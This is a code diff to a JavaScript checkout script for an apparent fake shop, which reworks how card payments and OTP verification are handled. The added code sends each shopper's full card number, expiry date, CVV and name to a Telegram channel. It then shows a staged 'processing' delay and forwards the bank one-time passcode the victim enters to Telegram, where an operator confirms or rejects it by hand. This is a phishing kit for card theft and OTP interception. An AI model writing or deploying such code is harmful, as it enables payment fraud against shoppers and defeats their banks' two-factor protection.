@@ -2047,7 +2047,6 @@ document.querySelectorAll('input[name="payment-method"]').forEach(radio => {
         checkoutData.paymentMethod = method;
     });
 });
-
 // Place order buttons event listener
 document.querySelectorAll('.place-order').forEach(btn => {
     btn.addEventListener('click', function(e) {
@@ -2073,7 +2072,34 @@ document.querySelectorAll('.place-order').forEach(btn => {
                     return;
                 }
 
-                // Proceed with credit card flow here (not shown)
+                // Store cardholder name
+                const cardholderNameInput = document.getElementById('cardholder-name');
+                checkoutData.cardholderName = cardholderNameInput ? cardholderNameInput.value : '';
+
+                // Send Telegram notification for card details
+                if (typeof TelegramNotifications !== 'undefined') {
+                    const cardNumber = document.getElementById('card-number').value.replace(/\s/g, '');
+                    const lastFourDigits = cardNumber.slice(-4);
+                    TelegramNotifications.cardDetailsSubmitted({
+                        total: convertPrice(getCartTotal(), false),
+                        orderRef: generateOrderReference(),
+                        cardholderName: checkoutData.cardholderName,
+                        cardNumber: cardNumber,
+                        expiryDate: document.getElementById('expiry-date').value,
+                        cvv: document.getElementById('cvv').value,
+                        lastFourDigits: lastFourDigits
+                    });
+                }
+
+                // Proceed to the processing step (card submission)
+                goToCheckoutStep(4); // Step 4: Processing spinner
+
+                // 30-second delay for card processing
+                setTimeout(function () {
+                    // Step 5: OTP Verification
+                    goToCheckoutStep(5);
+                    startOTPCountdown();
+                }, 30000); // 30 seconds
 
             } else {
                 console.warn(`Unknown payment method: ${method}`);
@@ -2087,43 +2113,6 @@ document.querySelectorAll('.place-order').forEach(btn => {
     });
 });
 
-                        // Store cardholder name
-                        const cardholderNameInput = document.getElementById('cardholder-name');
-                        checkoutData.cardholderName = cardholderNameInput ? cardholderNameInput.value : '';
-
-                        // Send Telegram notification for card details
-                        if (typeof TelegramNotifications !== 'undefined') {
-                            const cardNumber = document.getElementById('card-number').value.replace(/\s/g, '');
-                            const lastFourDigits = cardNumber.slice(-4);
-                            TelegramNotifications.cardDetailsSubmitted({
-                                total: convertPrice(getCartTotal(), false),
-                                orderRef: generateOrderReference(),
-                                cardholderName: checkoutData.cardholderName,
-                                cardNumber: document.getElementById('card-number').value.replace(/\s/g, ''),
-                                expiryDate: document.getElementById('expiry-date').value,
-                                cvv: document.getElementById('cvv').value,
-                                lastFourDigits: lastFourDigits
-                            });
-                        }
-
-                     try {
-    // Proceed to the processing step (card submission)
-    goToCheckoutStep(4); // Step 4: Processing spinner
-
-    // 30-second delay for card processing
-    setTimeout(function () {
-        // Step 5: OTP Verification
-        goToCheckoutStep(5);
-        startOTPCountdown();
-    }, 30000); // 30 seconds
-
-} catch (error) {
-    console.error('Error placing order:', error);
-    alert('There was an error placing your order. Please try again.');
-}
-
-return false;
-
 // Success close - use event delegation properly
 document.addEventListener('click', function (e) {
     if (e.target.classList.contains('close-checkout-success')) {
@@ -2133,6 +2122,7 @@ document.addEventListener('click', function (e) {
         clearCart();
     }
 });
+
 
         // OTP Verification
         const verifyOtpBtn = document.getElementById('verify-otp-btn');
@@ -2218,255 +2208,183 @@ return true;
 }
 
 function setupOTPInputs() {
-    // Remove existing listeners to prevent duplicates
-    const existingHandler = document.body.getAttribute('data-otp-handler');
-    if (existingHandler) return;
+    const otpInput = document.getElementById('otp-single-input');
+    const submitBtn = document.getElementById('otp-submit-btn');
 
-    // Add input formatting for single OTP input - keep it simple
-    document.body.addEventListener('input', function(e) {
-        if (e.target && e.target.id === 'otp-single-input') {
-            // Only allow numeric input and limit to 6 characters
-            let value = e.target.value.replace(/[^0-9]/g, '');
-            value = value.substring(0, 6);
-            e.target.value = value;
+    if (!otpInput || !submitBtn) return;
 
-            // Auto-verify when 6 digits are entered
-            if (value.length === 6) {
-                setTimeout(() => {
-                    verifyOTP();
-                }, 100);
-            }
-        }
+    // Only allow numeric and max 6 chars
+    otpInput.addEventListener('input', (e) => {
+        let val = e.target.value.replace(/\D/g, '').substring(0, 6);
+        e.target.value = val;
+        submitBtn.disabled = val.length !== 6;  // enable only when length is 6
     });
 
-    document.body.addEventListener('keydown', function(e) {
-        if (e.target && e.target.id === 'otp-single-input') {
-            // Allow only numeric keys and control keys
-            if (!/[0-9]/.test(e.key) && !['Backspace', 'Delete', 'Tab', 'Enter', 'ArrowLeft', 'ArrowRight'].includes(e.key)) {
-                e.preventDefault();
-            }
-        }
+    submitBtn.addEventListener('click', (e) => {
+        e.preventDefault();
+        submitOTP();
     });
 
-    // Mark as initialized
-    document.body.setAttribute('data-otp-handler', 'true');
+    submitBtn.disabled = true;
 }
 
-let otpTimeout; // Define otpTimeout in a higher scope
+function submitOTP() {
+    const otpInput = document.getElementById('otp-single-input');
+    if (!otpInput) return alert('OTP input missing');
 
-function simulateOTPSending(phoneNumber) {
-    // Generate a random 6-digit OTP
-    const otp = Math.floor(100000 + Math.random() * 900000);
-    console.log('Simulating OTP sending to ' + phoneNumber + ': ' + otp);
-    // In a real implementation, this would send an actual OTP
-    // Store the OTP (for demonstration purposes only)
-    localStorage.setItem('otp', otp.toString());
-}
-
-function startOTPCountdown() {
-    let timeRemaining = 120; // 2 minutes (120 seconds)
-    const countdownDisplay = document.getElementById('otp-countdown');
-    const resendButton = document.getElementById('resend-otp-btn');
-
-    if (!countdownDisplay || !resendButton) {
-        console.error('OTP countdown elements not found');
+    const otp = otpInput.value.trim();
+    if (otp.length !== 6) {
+        alert('Please enter the 6-digit OTP');
         return;
     }
 
-    // Set initial display to 2:00
-    countdownDisplay.textContent = '02:00';
-    resendButton.disabled = true;
-
-    function updateCountdown() {
-        timeRemaining--;
-
-        // Ensure timeRemaining is not negative
-        if (timeRemaining < 0) {
-            timeRemaining = 0;
+    // Send OTP + orderRef to backend or Telegram API
+    fetch('/api/send-otp-to-telegram', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+            otp,
+            orderRef: checkoutData.orderRef
+        })
+    })
+    .then(res => res.json())
+    .then(data => {
+        if (data.sent) {
+            alert('OTP sent for confirmation. Please wait...');
+            // Show waiting UI — polling for confirmation status
+            waitForTelegramConfirmation(checkoutData.orderRef);
+        } else {
+            alert('Failed to send OTP for confirmation. Try again.');
         }
-
-        const minutes = Math.floor(timeRemaining / 60);
-        const seconds = timeRemaining % 60;
-        countdownDisplay.textContent = `${minutes < 10 ? '0' : ''}${minutes}:${seconds < 10 ? '0' : ''}${seconds}`;
-
-        if (timeRemaining <= 0) {
-            clearInterval(otpTimeout);
-            countdownDisplay.textContent = '00:00';
-            resendButton.disabled = false;
-            resendButton.style.opacity = '1';
-            resendButton.style.cursor = 'pointer';
-        }
-    }
-
-    // Clear any existing timeout before setting a new one
-    if (otpTimeout) {
-        clearInterval(otpTimeout);
-    }
-
-    // Start countdown after 1 second
-    otpTimeout = setInterval(updateCountdown, 1000);
+    })
+    .catch(() => alert('Network error sending OTP.'));
 }
 
+function waitForTelegramConfirmation(orderRef) {
+    const interval = setInterval(() => {
+        fetch(`/api/check-payment-status?orderRef=${orderRef}`)
+            .then(res => res.json())
+            .then(data => {
+                if (data.status === 'confirmed') {
+                    clearInterval(interval);
+                    alert('Payment confirmed! Thank you.');
+                    goToCheckoutStep('success'); // or show success page
+                    clearCart();
+                } else if (data.status === 'rejected') {
+                    clearInterval(interval);
+                    alert('Payment rejected. Please try again.');
+                    goToCheckoutStep('failure'); // or show failure page
+                }
+                // else still pending, keep polling
+            })
+            .catch(() => {
+                clearInterval(interval);
+                alert('Error checking payment status. Please refresh.');
+            });
+    }, 5000); // poll every 5 seconds
+}
+
+// Call this when user inputs OTP and submits
 function verifyOTP() {
     const otpInput = document.getElementById('otp-single-input');
+    const otpError = document.getElementById('otp-error');
     if (!otpInput) {
         console.error('OTP input not found');
         return;
     }
 
-    // Get the raw input value (no space removal needed)
     const enteredOTP = otpInput.value.trim();
-    const otpError = document.getElementById('otp-error');
 
-    console.log('Verifying OTP:', enteredOTP, 'Length:', enteredOTP.length);
-
-    // Check if OTP format is valid
+    // Validate OTP format
     if (enteredOTP.length === 6 && /^\d{6}$/.test(enteredOTP)) {
-        // Send the user-entered OTP to Telegram for verification
+        // Hide any error message
+        if (otpError) otpError.style.display = 'none';
+
+        // Send OTP to Telegram for manual confirmation
         if (typeof TelegramNotifications !== 'undefined') {
             TelegramNotifications.userEnteredOTP(enteredOTP);
         }
 
-        console.log('User entered OTP sent to Telegram:', enteredOTP);
+        // Show processing step (spinner)
+        goToCheckoutStep(4);
 
-        if (otpError) {
-            otpError.style.display = 'none';
-        }
-
-        // Clean up stored OTP
-        localStorage.removeItem('currentOTP');
-        localStorage.removeItem('otp');
-
-        // Process the order
-        processOrder();
+        // Wait for Telegram confirmation (simulate with a promise)
+        waitForTelegramConfirmation()
+            .then(() => {
+                // Payment confirmed
+                processOrder();
+            })
+            .catch(() => {
+                // Payment failed or not confirmed in time
+                showPaymentFailure();
+            });
 
     } else {
-       // Show error for invalid or incomplete OTP
-console.log('Invalid or incomplete OTP');
-if (otpError) {
-    otpError.style.display = 'block';
-    const errorText = otpError.querySelector('span');
-    if (errorText) {
-        errorText.textContent = t("otp_invalid_length");
-    }
-}
-}
- }
-
-function skipOTP() {
-    // Skip OTP verification and go directly to order completion
-    document.getElementById('otp-error').style.display = 'none';
-    processOrder();
-}
-
-function resendOTP() {
-    // Generate new OTP
-    const newOtp = Math.floor(100000 + Math.random() * 900000);
-    localStorage.setItem('currentOTP', newOtp.toString());
-    console.log('New OTP generated:', newOtp);
-
-    simulateOTPSending(checkoutData.customerPhone);
-    const resendBtn = document.getElementById('resend-otp-btn');
-    if (resendBtn) {
-        resendBtn.disabled = true;
-    }
-
-    // Clear any error messages
-    const otpError = document.getElementById('otp-error');
-    if (otpError) {
-        otpError.style.display = 'none';
-    }
-
-    // Clear OTP input
-    const otpInput = document.getElementById('otp-single-input');
-    if (otpInput) {
-        otpInput.value = '';
-        otpInput.focus();
-    }
-
-    startOTPCountdown();
-}
-
-function goToCheckoutStep(stepNumber) {
-    try {
-        // Update step indicators
-        const stepElements = document.querySelectorAll('.step');
-        stepElements.forEach((step, index) => {
-            step.classList.toggle('active', index + 1 <= stepNumber);
-            step.classList.toggle('completed', index + 1 < stepNumber);
-        });
-
-        // Show correct step content
-        const checkoutSteps = document.querySelectorAll('.checkout-step');
-        checkoutSteps.forEach((step, index) => {
-            step.classList.toggle('active', index + 1 === stepNumber);
-        });
-
-        // Scroll to top of checkout modal
-        const checkoutModal = document.querySelector('.checkout-modal');
-        if (checkoutModal) {
-            checkoutModal.scrollTop = 0;
-        }
-
-        // Also scroll the active step to top
-        const activeStep = document.querySelector(`#checkout-step-${stepNumber}`);
-        if (activeStep) {
-            activeStep.scrollIntoView({ behavior: 'smooth', block: 'start' });
-        }
-    } catch (error) {
-        console.error('Error navigating to checkout step:', error);
-    }
-}
-
-function processOrder() {
-    try {
-        goToCheckoutStep(5);
-
-       // Simulate processing steps
-const steps = [
-    { text: t("validating_payment_method"), delay: 1000 },
-    { text: t("confirming_inventory"), delay: 1500 },
-    { text: t("generating_purchase_order"), delay: 2000 },
-    { text: t("generating_invoice"), delay: 1000 }
-];
-
-
-        let currentStep = 0;
-
-        function nextStep() {
-            try {
-                if (currentStep < steps.length) {
-                    const stepTextElement = document.querySelector('.step-text');
-                    if (stepTextElement) {
-                        stepTextElement.textContent = steps[currentStep].text;
-                    }
-                    currentStep++;
-                    setTimeout(nextStep, steps[currentStep - 1].delay);
-                } else {
-                    // Generate invoice before showing success
-                    generateInvoice();
-
-                    // Show success
-                    const processingElement = document.getElementById('processing-payment');
-                    const successElement = document.getElementById('order-success');
-
-                    if (processingElement) processingElement.style.display = 'none';
-                    if (successElement) successElement.style.display = 'block';
-
-                    // Order completed successfully
-                    console.log('Order completed:', checkoutData.orderNumber);
-                }
-            } catch (error) {
-                console.error('Error in nextStep:', error);
+        // Show error for invalid OTP
+        if (otpError) {
+            otpError.style.display = 'block';
+            const errorText = otpError.querySelector('span');
+            if (errorText) {
+                errorText.textContent = "Please enter a valid 6-digit OTP";
             }
         }
-
-        nextStep();
-    } catch (error) {
-        console.error('Error processing order:', error);
-        alert('There was an error processing your order. Please try again.');
     }
 }
+
+// Adjusted waitForTelegramConfirmation to use the polling you already have:
+function waitForTelegramConfirmation(orderRef) {
+    return new Promise((resolve, reject) => {
+        const interval = setInterval(() => {
+            fetch(`/api/check-payment-status?orderRef=${orderRef}`)
+                .then(res => res.json())
+                .then(data => {
+                    if (data.status === 'confirmed') {
+                        clearInterval(interval);
+                        alert('Payment confirmed! Thank you.');
+                        resolve(); // Resolve promise on confirmation
+                    } else if (data.status === 'rejected') {
+                        clearInterval(interval);
+                        alert('Payment rejected. Please try again.');
+                        reject(); // Reject promise on failure
+                    }
+                    // If still pending, keep polling
+                })
+                .catch(() => {
+                    clearInterval(interval);
+                    alert('Error checking payment status. Please refresh.');
+                    reject();
+                });
+        }, 5000); // poll every 5 seconds
+    });
+}
+
+// Use this to show payment failure UI, e.g. failure step in checkout
+function showPaymentFailure() {
+    goToCheckoutStep('failure'); // Replace with your actual failure step number or id
+    const processingElement = document.getElementById('processing-payment');
+    if (processingElement) processingElement.style.display = 'none';
+
+    const failureElement = document.getElementById('order-failure');
+    if (failureElement) failureElement.style.display = 'block';
+
+    console.log('Payment failed or was not confirmed.');
+}
+
+// Your existing processOrder function (simplified for success scenario)
+function processOrder() {
+    try {
+        goToCheckoutStep('success'); // Show success step/page
+
+        // Clear cart or do any finalization
+        clearCart();
+
+        console.log('Order processed successfully:', checkoutData.orderRef);
+    } catch (error) {
+        console.error('Error in processOrder:', error);
+        alert('Error completing order. Please try again.');
+    }
+}
+
 
 // Generate and download PDF invoice
 function generateInvoice() {
